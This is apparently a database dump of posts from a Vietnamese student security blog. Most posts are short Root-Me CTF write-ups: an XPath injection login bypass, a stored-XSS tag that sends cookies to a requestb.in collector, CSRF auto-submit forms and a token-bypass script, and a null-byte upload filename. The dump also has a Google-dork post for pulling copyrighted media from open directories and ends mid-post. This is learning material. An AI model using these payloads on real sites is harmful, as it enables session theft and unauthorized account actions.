(12, 0, '[Hacking] Lấy link download media từ google', 'hacking-lay-link-download-media-tu-google', 'Thời buổi này vấn đề bản quyền ngày càng được chú trọng, bây giờ đến cả zing cũng giới hạn quyền download, phải trả tiền bản quyền mới download được. Bài viết này sẽ hướng dẫn mọi người cách lấy link download media, audio, video,... qua google.<br>Rất đơn giản, mọi người chỉ cần gõ vào khung tìm kiếm nội dung mình cần tìm (tên bài hát, tên phim,...) kèm theo đoạn code sau: <code>-inurl:(htm|html|php|pls|txt) intitle:index.of “last modified” (mp4|wma|aac|avi)<br></code>Kết quả trả về sẽ dưới dạng folder lưu trữ tài nguyên của các trang web được index.<br>Ví dụ:<br>Tìm kiếm <b>animals maroon 5</b>, gõ <code>animals maroon -inurl:(htm|html|php|pls|txt) intitle:index.of “last modified” (mp4|wma|aac|avi)<br></code>trả lại một list các trang lưu trữ <br><img src=\"http://i97.servimg.com/u/f97/17/70/31/89/screen10.png\"><br>Chọn 1 đường dẫn, tìm kiếm file mình cần tìm<br><img src=\"http://i97.servimg.com/u/f97/17/70/31/89/screen12.png\"><br>Right click &gt;&gt; Save media as...<br><img src=\"http://i97.servimg.com/u/f97/17/70/31/89/screen11.png\"><br><br>Enjoy :3<br>', 56, 2, 20, 0, '2016-10-03 15:06:43', '2016-10-03 07:06:43', '2016-10-03 07:06:43'),
(13, 0, '[OS] Kali Linux - Hệ điều hành của các chuyên gia bảo mật, hacker', 'os-kali-linux---he-dieu-hanh-cua-cac-chuyen-gia-bao-mat-hacker', 'Ở bài này mình sẽ hướng dẫn cài đặt trên Virtual Box (máy ảo) (nghĩa là chạy Kali Linux trong nền Windows hay hệ điều hành gì mà mọi người đang dùng)<br><br>I. Cài đặt Virtual Box<br>Tải Virtual Box:<br>Cài đặt: Cứ bấm next thôi.<br><br>II. Tải Kali Linux image disk<br>Link download:<br>', 56, 2, 16, 0, '2016-10-15 00:07:00', '2016-10-14 16:07:00', '2016-10-14 16:07:00'),
(10, 0, '[Hacking game] Capture the flag', 'hacking-game-capture-the-flag', '<div style=\"text-align: center;\"><b><font size=\"6\">Capture the flag</font></b></div><div style=\"text-align: center;\"></div><div><b><font size=\"5\">I. Capture the flag là gì</font></b></div><blockquote><div>CTF (Capture the Flag) là một cuộc thi kiến thức chuyên sâu về bảo mật máy tính, được tổ chức theo mô hình trò chơi chiến tranh mạng, tập trung vào hai kỹ năng tấn công và phòng thủ mạng máy tính của người chơi.</div></blockquote><div>Thế thôi, nói dông nói dài chẳng có trọng tâm, mấy phần sau mới quan trọng.</div><div><b><font size=\"5\"><br></font></b></div><div><b><font size=\"5\">II. Các hình thức phổ biến của CTF (đọc qua thôi)</font></b></div><div><b><font size=\"4\">1. </font></b><font size=\"4\"><font size=\"4\"><b>Jeopardy-style</b> <font size=\"3\">(</font></font><font size=\"3\">Trả lời thử thách theo từng chủ đề)</font> </font>(chủ yếu mình chơi cái này này)</div><div>Hình thức này là tập hợp một loạt các các bài thi khác nhau được phân ra thành nhiều chủ để như: Web, Forensic, Crypto, Binary, Stegao… Trong mỗi chủ đề này sẽ có nhiều bài thi khác nhau được sắp theo theo độ khó tăng dần và điểm số của các bài thi đó cũng được sắp sắp tăng dần theo độ khó. Mục tiêu của các đội là sử dụng các kỹ năng, kinh nghiệm để thực hiện tìm kiếm các “flag” được giấu. Với mỗi “flag” chính xác thì đội chơi sẽ được cuộc điểm tương ứng với bài thi. Trong quá trình thi kết quả các đội sẽ liên tục được cập nhật trên các bảng điểm (sau khi gửi flag thì mới được tính điểm) và kết thúc vòng thi đội nào có số điểm cao nhất sẽ dành chiến thắng. Trong trường hợp bằng điểm nhau thì kết quả được tính dựa trên thời gian gửi “flag”. Đây là hình thức thi được tổ chức phổ biến nhất hiện nay. Thông thường một cuộc thi CTF theo hình thức này được tổ chức trong 1 đến 2 ngày (24- 48 tiếng) .</div><div></div><div><b><font size=\"4\">2. </font><font size=\"4\">“</font><font size=\"4\"><font size=\"4\">Attack &amp; defence</font></font></b><font size=\"4\"><font size=\"4\"><b><font size=\"4\">”</font></b><font size=\"3\"> </font></font><font size=\"3\">(“Tấn công &amp; phòng thủ”)</font></font></div><div>Đây là hình thức theo đúng luật thi CTF cổ điển ban đầu như được giới thiệu ở phần trên của bài viết. Hình thức này khó hơn so với hình thức khác do yêu cầu cơ hơn ở người chơi ngoài các kỹ năng tìm kiếm lỗ hổng bảo mật, khai thác các lỗ hổng đó thì người chơi cần có có khả năng khắc phục các điểm yếu lỗ hổng, bảo vệ hệ thống của mình trước các tấn công từ các đội khác. Điểm khác biệt nữa của hình thức này là trong cách thức tính điểm cho các đội thi. Với hình thức này có thể có nhiều các loại điểm được tính khác nhau như: Điểm tấn công, điểm phòng thủ, điểm thưởng,…Sau khi kết thúc cuộc thi đội nào có điểm cao nhất sẽ dành chiến thắng. Có thể nói hình thức thi này là hình thức gần với thực tế nhất. Các hacker thực hiện tấn công vào hệ thống, các nhà quản trị mạng – chuyên viên bảo mật có nhiệm vụ chống lại các tấn công từ bên ngoài và vẫn phải bảo đảm duy trì hoạt động của hệ thống… Cuộc thi nổi tiếng nhất về dạng này là DEF CON CTF .</div><div></div><div><b><font size=\"4\">3. Kết hợp</font></b> của hình thức 1 và 2, chẳng hạn như kết hợp giữa hình thức chỉ có tấn công (attack only) với các dạng thử thách khác nhau.</div><div><b><font size=\"5\"><br></font></b></div><div><b><font size=\"5\">III. Học viện và cuộc thi \"Sinh viên với An toàn thông tin\"</font></b></div><div>Từ năm 2014 học viện mình đã dấn thân vào cuộc thi này và năm 2015 đã có kết quả khá tốt là giải ba cấp Quốc gia. Mình học bảo đảm thì đây chính là cuộc thi dành cho bọn mình, không đi thi thì đúng là không đáng mặt học bảo mật.</div><div>CTF gồm nhiều mảng, nếu mình muốn đi thi thì phải lập team, mỗi người trong team phải chuyên về 1 mảng, không cần học tràn lan, mỗi người một lĩnh vực là được.</div><div>Phần dưới tớ sẽ nói qua về các mảng này, những post sau tớ sẽ đưa link tới các trang luyện tập, mọi người đọc đề và write-up (hướng dẫn) rồi thử làm, để biết mình cảm thấy thích và có khả năng trong phần nào để tập trung vào đó. (Nếu chưa biết mình hợp với mảng nào thì cứ từ từ, dần dần)</div><div>Sau khi mọi người cảm thấy muốn tập trung vào mảng nào, tớ sẽ tìm cho mọi người các anh khóa trên chuyên về mảng đó để mọi người tự liên hệ. <img src=\"http://localhost/mRoom/assets/emoticons/grin.png\" data-sceditor-emoticon=\":D\" alt=\":D\" title=\":D\"></div><div><b><font size=\"5\"><br></font></b></div><div><b><font size=\"5\">IV. Các mảng <u>phổ biến</u> trong CTF <i><font color=\"#ff3333\">(quan trọng)</font></i></font></b></div><div>Ghi nhớ là chỉ <b>phổ biến</b> thôi nhé.</div><div><b><font size=\"4\">1. Crypto</font></b> (Đánh đố giải mã, tấn công các thuật toán mã hóa,...)</div><div>Có rất nhiều thuật mã hóa, mọi người có thể thấy ở đây: (cũng là tool decrypt luôn) <a href=\"http://rumkin.com/tools/cipher/\">http://rumkin.com/tools/cipher/</a></div><div>Và một tool để decode đoạn văn bản mã hóa bằng phương pháp tần suất xuất hiện: <a href=\"http://quipqiup.com/\">http://quipqiup.com/</a></div><div>(2 tool này là cần thiết để làm bài luyện tập sau này tớ đưa link nhé <img src=\"http://localhost/mRoom/assets/emoticons/grin.png\" data-sceditor-emoticon=\":D\" alt=\":D\" title=\":D\">)</div><div>Bản chất của crypto là ánh xạ, hiểu đơn giản là vậy.</div><div>Ví dụ, trong đoạn văn bản gốc, \"<b>My name is Tu</b>\" bị mã hóa qua ánh xạ f (&lt;=&gt; ánh xạ từng từ)</div><code><div>M -(f)-&gt; Cy -(f)-&gt; g<br />\r\n[space] -(f)-&gt;[space]<br />\r\n...<br />\r\nu -(f)-&gt; j</div></code><div>sau ánh xạ sẽ được đoạn văn bản encrypt là \"<b>Cg bqct pl k</b>j\".</div><div>Nghĩa là để decrypt thì mình phải biết ánh xạ đó là gì.</div><div>Nhưng đó là để hiểu bản chất thôi, còn việc decrypt thì đã có các tool giải quyết, chỉ cần nắm được dữ liệu này thì có thể áp dụng phương pháp mã hóa nào, rồi ném vào tool mà giải mã thôi <img src=\"http://localhost/mRoom/assets/emoticons/grin.png\" data-sceditor-emoticon=\":D\" alt=\":D\" title=\":D\"></div><div></div><div><b><font size=\"4\">2. Web</font></b> (Các kỹ thuật tìm điểm yếu, lỗ hổng trên ứng dụng web)</div><div>Cái này chắc là dễ hình dung nhất này, vì bình thường mọi người cũng hay gặp trường hợp bị hack mật khẩu, thực thi lệnh xấu (bad cmd) trên server chủ để hack thông tin...</div><div>Vậy thì lỗ hổng này ở đâu mà ra? Ở mức độ căn bản thì hacker tấn công thông qua cookie (như kiểu mấy trang download tốc độ cao cần id vip ấy, mình chỉ cần request lại và thay đổi cookie user thành id của user vip là lấy được link) (tớ sẽ tìm hiểu thêm để viết bài này có demo <img src=\"http://localhost/mRoom/assets/emoticons/grin.png\" data-sceditor-emoticon=\":D\" alt=\":D\" title=\":D\">) hoặc truy vấn (cái này mình phải học thêm về máy chủ Windows và Linux để biết câu lệnh nào máy chủ sẽ thực thi được để mà gửi truy vấn).</div><div>Nói chung ở phần này cái quan trọng nhất là phải đọc qua về php và python (chắc chắn tớ sẽ viết 1 bài về php) vì hầu như trang web nào cũng dùng 2 ngôn ngữ này để code, mình phải hiểu (có thể không biết lập trình, nhưng đọc code phải hiểu nó dùng để làm cái gì) để có thể gửi request đúng.</div><div>Một cái nữa là javascript. Cái này thì 100% website đều dùng. Nhưng javascript là ngôn ngữ client-side (nghĩa là không thể dựa vào javascript mà gửi truy vấn được, chỉ có thể dựa vào nó để thực hiện một số thao tác như tìm link để gửi request, hoặc dịch ngược...)</div><div>Một chú ý khi làm web đó là \"dùng FIREFOX\"! Firefox là trình duyệt cho nhà phát triển (developer), ko nói đến Chromium quá hại ram, bảo mật và add-ons trên firefox mới đủ để đáp ứng hacker.</div><div></div><div><b><font size=\"4\">3. Reverse engineering</font></b> (tập trung vào kĩ năng dịch ngược mã nguồn phần mềm, cách unpack các packer, crypter bảo vệ phần mềm)</div><div>Cái này bản thân tớ thấy khá thú vị, nhưng cũng khá khoai. Vì để dịch ngược được mã thì trước hết phải hiểu mã này nghĩa là gì, nó dùng làm gì, sau đó từ mã đấy và đầu ra để suy ra đầu vào, hoặc từ đầu vào, đầu ra và đoạn mã để suy ra key (dùng cho decrypt)Thường thì làm về mảng web cũng sẽ lấn một chút sang cái này (RE)</div><div>Đoạn mã có thể ở bất kỳ ngôn ngữ nào, nên đòi hỏi phải biết hết thì hơi khó, nhưng phải nắm được cơ bản của cấu trúc lập trình (thường các ngôn ngữ cũng same same như nhau thôi, cái gì lạ lạ thì tra google)</div><div>Nhưng yên tâm làm cái này ít nhất phải biết cơ bản Assemby, C, Python, Php, Java, Javascript,...</div><div></div><div><font size=\"4\"><b>4. Forensic</b>&nbsp;</font>(Điều tra, phân tích, truy vết...)</div><div>Trong 4 cái thì đây là cái khó nhất, kết hợp của tất cả các kỹ năng. Nghĩa là để giải quyết bài toán này cần sự phối hợp của cả team. Hình dung cơ bản thì Forensic là kỹ thuật phân tích dựa trên những tín hiệu truyền đi mà máy mình nghe trộm được, sau khi nghe đủ các dữ liệu cần thiết ta sẽ tiến hành phân tích, xem phải làm cái gì cái gì để tìm cờ, ví dụ sau khi phân tích dữ liệu ta lấy được link website, thì phải truy cập vào website đó xem có gì không, vào đó lại thấy một đoạn code được mã hóa, thế là phải dịch ngược mã, giải mã,... Đại loại thế.</div><div><b><font size=\"5\"><br></font></b></div><div><b><font size=\"5\">V. Để tham gia CTF thì cần gì?</font></b></div><div><b><font size=\"4\">1. Kỹ năng làm việc nhóm</font></b></div><div>CTF không giống những cuộc thi truyền thống, mà nó thoải mái hơn rất nhiều. Trong suốt thời gian thi, người tham gia được quyền sự dụng <b>MỌI</b> loại tool có thể để khai thác lỗ hổng, tìm được flag và qua bàn, không tù như ACM hay các kiểu thi Olympic khác.&nbsp;</div><div>CTF là cuộc thi đồng đội, vì nó bao hàm rất nhiều lĩnh vực (web, crypto, reverse engineering, forensics,...) nên một người không thể ôm đồm hết được, mỗi người buộc phải chuyên sâu về một mảng và giải quyết vấn đề của mình. Đặc biệt forensics là những bài khó, cần phân tích + các kỹ năng khác nữa (có thể là 1 chút RE, 1 chút web, 1 chút crypto, 1 chút binaries,...) nên kỹ năng làm việc nhóm là rất quan trọng.</div><div></div><div><b><font size=\"4\">2. Kỹ năng lập trình</font></b></div><div>Đây là chắc chắn phải có. Có thể không code được 1 dự án hoàn chỉnh, nhưng phải biết cấu trúc câu lệnh, như trong RE thì biết được đoạn mã đó để làm gì để còn dịch ngược lại, đại khái cái nào cũng đều phải biết code thì mới mò được lỗ hổng mà khai thác.</div><div></div><div><b><font size=\"4\">3. Khả năng chuyên sâu 1 lĩnh vực</font></b></div><div>Vì CTF bao hàm rất nhiều lĩnh vực (web, crypto, reverse engineering, forensics,...) nên một người không thể ôm đồm hết được. \"Một nghề cho chín còn hơn chín nghề\" chính là hình dung rõ nét nhất về cái này.</div><div></div><div><b><font size=\"4\">4. Tiếng anh</font></b></div><div>Khi đi thi thì đề vẫn là tiếng việt thôi, nhưng khi luyện tập thì mình chủ yếu phải làm trên trang tiếng anh hết. Lập trình đã ít tài liệu tiếng việt rồi mấy cái bảo mật này còn ít hơn.</div><div><b><font size=\"5\"><br></font></b></div><div><b><font size=\"5\">VI. Bắt đầu từ đâu?</font></b></div><div>Link dưới đây là bài cho học sinh cấp 3 của Mỹ, mọi người xem qua và đọc write-up (hướng dẫn) xem có làm được không, nếu làm được thì tốt, không thì tớ sẽ viết lại write-up bằng tiếng việt và kèm hướng dẫn cụ thể về những cái cho người mới.</div><div>.</div><div>Link luyện tập thử: <a href=\"https://picoctf.com\">https://picoctf.com</a></div><div>Mọi người đăng ký tài khoản và tạo team mới, click Game &gt;&gt; <a href=\"https://picoctf.com/problems\">Switch to the basic problem viewer</a> &nbsp;</div><div>Phải giải được bài đầu tiên nó mới hiển thị các bài tiếp theo. Mọi người đọc Hints, nếu không làm được thì copy paste đề bài vào google sẽ ra write-up, đơn giản vậy thôi.</div>', 57, 1, 108, 0, '2016-09-28 01:39:35', '2016-09-27 17:39:35', '2016-09-27 17:39:35'),
(37, 0, '[Web server] XPath injection - authentication', 'web-server-xpath-injection---authentication', '<p>Username:&nbsp;<b><font color=\"#ff3333\">John</font>\' or E or \'\'=\'</b> (the Boolean XPath expression E)</p><p>(Since John is administrator according to the members page:&nbsp;<a href=\"http://challenge01.root-me.org/web-serveur/ch23/?action=members\">http://challenge01.root-me.org/web-serveur/ch23/?action=members</a></p><p>And, tada! the flag is John password:&nbsp;<b>6FkC67ui8njEepIK5Gr2Kwe</b></p><p>-----</p><p>Or one more way:</p><p>Username:&nbsp;<span style=\"background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; white-space: pre;\">John\' and (\'\'=\'\' or \'\'=\'</span></p><p>Password:&nbsp;<span style=\"background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; white-space: pre;\">\') and \'\'=\'</span></p><p><br></p><p>Read more:&nbsp;<a href=\"http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Blind%20Xpath%20injection.pdf\">Blind Xpath injection</a>&nbsp;(MOUNTING A BLIND XPATH INJECTION section)</p>', 71, 2, 1, 0, '2017-01-12 10:20:31', '2017-01-12 02:20:31', '2017-01-12 02:20:31'),
(14, 0, '[Web server] User agent', 'web-server-user-agent', 'Để ý gợi ý: Admin is dumb.<br>=&gt; Sửa user agent thành tên admin =&gt; Solved<br><p><br></p>', 71, 2, 2, 0, '2016-10-30 01:45:41', '2016-10-29 17:45:41', '2016-10-29 17:45:41'),
(15, 0, '[Web client] XSS - stored 1', 'web-client-xss---stored-1', '<p>Lỗ hổng XSS: Cross-site scripting</p><p>Chèn được script vào request =&gt; người load trang sẽ chạy đoạn script đó<a href=\"https://www.youtube.com/watch?v=tZcHyaMR3oc\"></a><br></p><p>Using requestb.in, tạo request mới, chèn code ảnh <code>&lt;img src=\"http://requestb.in/[requestbinID]?inspector=\'+document.cookie+\'\"/&gt;<br></code>rồi vào trang requestb.in xem request trả về, sẽ lấy được giá trị cookie =&gt; Solved.<br></p><p><br></p><p>Reference: <a href=\"https://en.wikipedia.org/wiki/Cross-site_scripting\">https://en.wikipedia.org/wiki/Cross-site_scripting</a><br>Youtube: <a href=\"https://www.youtube.com/watch?v=tZcHyaMR3oc\">https://www.youtube.com/watch?v=tZcHyaMR3oc</a></p>', 72, 2, 18, 0, '2016-10-30 01:47:20', '2016-10-29 17:47:20', '2016-10-29 17:47:20'),
(16, 0, '[Web server] Backup file', 'web-server-backup-file', '<p>Định dạng các file backup: <b>index.php~</b></p><p>=&gt; Chạy save file index.php~ về, được đoạn code pass.<br></p>', 71, 2, 64, 1, '2016-10-30 01:48:28', '2016-10-29 17:48:28', '2016-12-06 08:46:13'),
(17, 0, '[Web server] HTTP Headers', 'web-server-http-headers', '<h3 class=\"crayon challenge-soustitre-36 \" itemprop=\"about\">HTTP response give informations</h3><p>nghĩa là phải đọc HTTP response. Sử dụng Burp Suite (Repeater) để đọc đồng thời sửa http header request.</p><p>Full write-up: <a href=\"http://blog.phonecyber.net/write-up/root-me-http-headers\">http://blog.phonecyber.net/write-up/root-me-http-headers</a></p><p>Reference:&nbsp;<a href=\"https://hack-ed.net/2016/01/09/burp-suite-for-beginners/\">https://hack-ed.net/2016/01/09/burp-suite-for-beginners/</a></p>', 71, 2, 2, 0, '2016-10-30 18:38:14', '2016-10-30 10:38:14', '2016-10-30 10:38:14'),
(18, 0, '[Web server] HTTP verb tampering', 'web-server-http-verb-tampering', 'Đổi http verb (cũng là header request =&gt; dùng burp suite repeater)<br>Full write-up: <a href=\"http://blog.phonecyber.net/write-up/root-me-http-verb-tampering\">http://blog.phonecyber.net/write-up/root-me-http-verb-tampering</a><br>', 71, 2, 1, 0, '2016-10-30 19:06:08', '2016-10-30 11:06:08', '2016-10-30 11:06:08'),
(19, 0, '[Web server] Install files', 'web-server-install-files', 'Ctrl+U &gt;&gt; get line <br><code>&lt;!-- ... --&gt;<br></code><br>Access <a href=\"http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/\">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/</a> &gt;&gt; install.php<br>Access <a href=\"http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php\">http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php</a><br>Bingo!<br>', 71, 2, 39, 0, '2016-10-30 19:09:35', '2016-10-30 11:09:35', '2016-10-30 11:09:35'),
(20, 0, '[Web client] CSRF - 0 protection', 'web-client-csrf---0-protection', '<p> <span class=\"notranslate\"> CSRF flaw ( \"Cross site request forgery\") is often equated with XSS flaws when the two are diametrically opposed.</span> <span class=\"notranslate\" style=\"\"><br />\r\n When XSS looking to steal personal information from the user, the CSRF <br />\r\ntrying to make him perform actions without his knowledge directly on <br />\r\ntheir computer.</span> <span class=\"notranslate\"><br />\r\n In the first part, we have seen how the hacker was using XSS to steal <br />\r\ncookies from the administrator in order to take control of the site.</span> <span class=\"notranslate\"> If the hacker decided to use CSRF, it would execute the action directly on the computer of the victim.</span></p><p><span class=\"notranslate\">(Đại khái là để khai thác lỗi này thì ta sẽ gửi một form hoặc iframe thực thi nhiệm vụ nào đó </span><span class=\"notranslate\">đến người có quyền thực thi</span> hành động đó)</p><p><br></p><p><i>Ví dụ:</i> Muốn xóa nick một người abc, phải sử dụng link <u><b>http://link.com?action=delete&amp;username=abc</b></u></p><p>Nhưng mình không có thẩm quyền thực hiện nhiệm vụ đó nên ta sẽ gửi một form hoặc iframe thực hiện nhiệm vụ đó đến admin - người có thẩm quyền.</p><p>Áp dụng vào bài này tương tự thế, ta sẽ gửi form kích hoạt tài khoản (lấy trong tab profile sau khi login), sửa đổi thông tin:</p><p><code>&lt;form name=\"CSRF\" id=\"CSRF\"<br>action=\"http://challenge01.root-me.org/web-client/ch22/?action=profile\" method=\"post\"&gt;<br>		&lt;div class=\"form-group\"&gt;<br>		&lt;label&gt;Username:&lt;/label&gt;<br>		&lt;input name=\"username\" value=\"abc\" type=\"text\"&gt;<br>		&lt;/div&gt;<br>		&lt;br&gt;		<br>		&lt;div class=\"form-group\"&gt;<br>		&lt;label&gt;Status:&lt;/label&gt;<br>		&lt;input name=\"status\" checked type=\"checkbox\"&gt;<br>		&lt;/div&gt;<br>		&lt;br&gt;	<br>		&lt;button type=\"submit\"&gt;Submit&lt;/button&gt;<br>&lt;/form&gt;<br></code></p><p>và&nbsp; 1 dòng javascript để submit form đó <code>&lt;script type=\"text/javascript\"&gt;document.getElementById(\"CSRF\").submit();&lt;/script&gt;<br></code></p><p>Rồi. Giờ gửi form này cho admin qua form Contact.</p><p>&gt;&gt; Solved.</p><p>Full write-up: <a href=\"http://playourhack.fr/csrf-0-protection-root-me\">http://playourhack.fr/csrf-0-protection-root-me</a><br></p>', 72, 2, 3, 0, '2016-10-31 16:39:56', '2016-10-31 08:39:56', '2016-10-31 08:39:56'),
(21, 0, '[Web client] CSRF - Bypass token', 'web-client-csrf---bypass-token', '<p>Reference:&nbsp;<a href=\"http://localhost/mRoom/b/root-me/rileykidd.com/2013/09/09/using-xss-to-csrf/\">rileykidd.com/2013/09/09/using-xss-to-csrf/</a></p><p><a href=\"https://www.zerocopter.com/blog/security/5-ways-to-csrf/\">https://www.zerocopter.com/blog/security/5-ways-to-csrf/</a><br></p><p class=\"\"></p><p class=\"\"></p><p class=\"\"></p><blockquote><ol><li>First request the form&nbsp;<br></li><li>Extract the valid csrf token&nbsp;<br></li><li>Finally submit the form using the valid csrf token<br></li></ol></blockquote><p></p><p class=\"\"></p><p></p><p class=\"\"></p><p></p><p></p><p class=\"\"><b><br></b></p><p class=\"\"><b><font size=\"4\">Script:</font></b></p><p></p><p></p><p></p><p class=\"\" style=\"margin: 0px; padding: 0px; font-family: Ubuntu, Roboto, Arial, Verdana, Helvetica, sans-serif; font-size: 12px; line-height: 24px; color: rgb(68, 68, 68); font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: normal; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;\"><code style=\"margin-top: 1.5em; position: relative; background: rgb(238, 238, 238); color: rgb(34, 34, 34); white-space: pre; padding: 0.25em; display: block; text-align: left;\">&lt;script&gt;<br />\r\n  // request form<br />\r\n  function request(url, type, callback, send){<br />\r\n      var oReq = new XMLHttpRequest();<br />\r\n      oReq.open(type, url, true);<br />\r\n      oReq.setRequestHeader(\'Content-type\', \'application/x-www-form-urlencoded\');<br />\r\n      oReq.onload = callback;<br />\r\n      oReq.send(send);<br />\r\n  };<br><br />\r\n  // process form data =&gt; get token<br />\r\n  function getListener () {<br />\r\n      var el = document.createElement(\'div\');<br />\r\n      el.innerHTML = this.responseText; <br />\r\n      request(\'http://challenge01.root-me.org/web-client/ch23/?action=profile\', \'POST\', postListener, \'token=\' + el.querySelector(\'input[name=\"token\"]\').value + \'&amp;username=abc&amp;status=on\');<br />\r\n  };<br><br />\r\n  // apply token to new form and submit<br />\r\n  function postListener(){<br />\r\n      console.log(this.responseText)<br />\r\n  };<br><br />\r\n  // game on ;;)<br />\r\n  request(\'http://challenge01.root-me.org/web-client/ch23/?action=profile\', \'GET\', getListener);<br />\r\n&lt;/script&gt;</code></p><p class=\"sceditor-nlf\"><br></p>', 72, 1, 33, 0, '2016-11-01 15:58:16', '2016-11-01 07:58:17', '2016-11-01 07:58:17'),
(22, 0, 'Reference', 'reference', '<a href=\"https://ml-book-vn.khanhxnguyen.com/1_2_overfitting.html\">https://ml-book-vn.khanhxnguyen.com/1_2_overfitting.html</a><div>And: <a href=\"https://en.wikipedia.org/wiki/Machine_learning#Types_of_problems_and_tasks\">https://en.wikipedia.org/wiki/Machine_learning#Types_of_problems_and_tasks</a>&nbsp;</div><div>Support vector machine:&nbsp;<a href=\"https://en.wikipedia.org/wiki/Support_vector_machine#Support_vector_clustering_.28SVC.29\">https://en.wikipedia.org/wiki/Support_vector_machine#Support_vector_clustering_.28SVC.29</a></div>', 70, 1, 6, 0, '2016-11-01 16:22:19', '2016-11-01 08:22:19', '2016-11-01 08:22:19'),
(23, 0, '[Web server] File upload – null byte', 'web-server-file-upload--null-byte', '<div id=\"post-276\" class=\"single-post post-276 post type-post status-publish format-standard hentry category-capture-the-flagctf category-challenges category-ctf category-root-me tag-capture-the-flag tag-challenges tag-ctf tag-null-byte tag-root-me tag-web-server\" style=\"margin-top: 0px; margin-bottom: 20px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: 20.3px; vertical-align: top; float: none; margin-right: 20px !important; margin-left: 20px !important;\"><div class=\"post-contents entry-content\" style=\"margin: 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\"><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\"></p><blockquote><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">– &nbsp;<span style=\"font-variant-numeric: inherit; border-style: initial; border-color: initial; border-image: initial; font-stretch: inherit; line-height: inherit; vertical-align: top;\">URL:&nbsp;</span>hxxps://www.root-me.org/en/Challenges/Web-Server/File-upload-null-byte<br>–&nbsp;<span style=\"font-variant-numeric: inherit; border-style: initial; border-color: initial; border-image: initial; font-stretch: inherit; line-height: inherit; vertical-align: top;\">AUTOR:</span>&nbsp;<a href=\"https://www.root-me.org/g0uZ\" style=\"font-variant-numeric: inherit; margin: 0px; padding: 0px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top; outline: 0px; transition: all 0.5s;\">g0uZ</a><br>–&nbsp;<span style=\"font-variant-numeric: inherit; border-style: initial; border-color: initial; border-image: initial; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Difultad/Nivel:</span>&nbsp;Medio<br>–&nbsp;<span style=\"font-variant-numeric: inherit; border-style: initial; border-color: initial; border-image: initial; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Información:&nbsp;</span>Your goal is to hack this photo galery by uploading PHP code.</p></blockquote><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Otra vez más, el título nos ayuda:</p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Vamos a&nbsp;intentar de subir un archivo php (cualquiera) pero luego de la extensión .php le agregamos el null byte; A cntinuación de eso le colocamos una extensión válida que soporte o acepte subir el challenger.</p><table style=\"font-variant-numeric: inherit; margin-bottom: 20px; border-width: 0px; border-style: initial; border-color: initial; font-stretch: inherit; line-height: inherit; vertical-align: top; border-collapse: collapse; border-spacing: 0px;\"><tbody style=\"margin: 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\"><tr style=\"margin: 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">archivo php</td><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">null byte</td><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">extensión válida</td></tr><tr style=\"margin: 0px; padding: 0px; border: 0px; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top; background-image: initial; background-position: initial; background-size: initial; background-repeat: initial; background-attachment: initial; background-origin: initial; background-clip: initial;\"><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">imagendetest.php</td><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">%00</td><td style=\"margin: 0px; padding: 5px 20px; border-width: 0px; border-style: initial; border-color: initial; font-variant-numeric: inherit; font-stretch: inherit; line-height: inherit; vertical-align: top;\">.jpg</td></tr></tbody></table><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">tendría que quedar un nombre similar a esto:</p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\"><code><span style=\"white-space: normal; font-family: Ubuntu, Roboto, Arial, Verdana, Helvetica, sans-serif; color: rgb(68, 68, 68);\">imagendetest.php%00.jpg</span></code></p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Recuerden que&nbsp;el&nbsp;null byte (%00) se utiliza en ciertas circunstancias para “cortar” variables o comandos.</p><p style=\"font-variant-numeric: inherit; margin-bottom: 20px; border: 0px; font-stretch: inherit; line-height: inherit; vertical-align: top;\">Probemos de 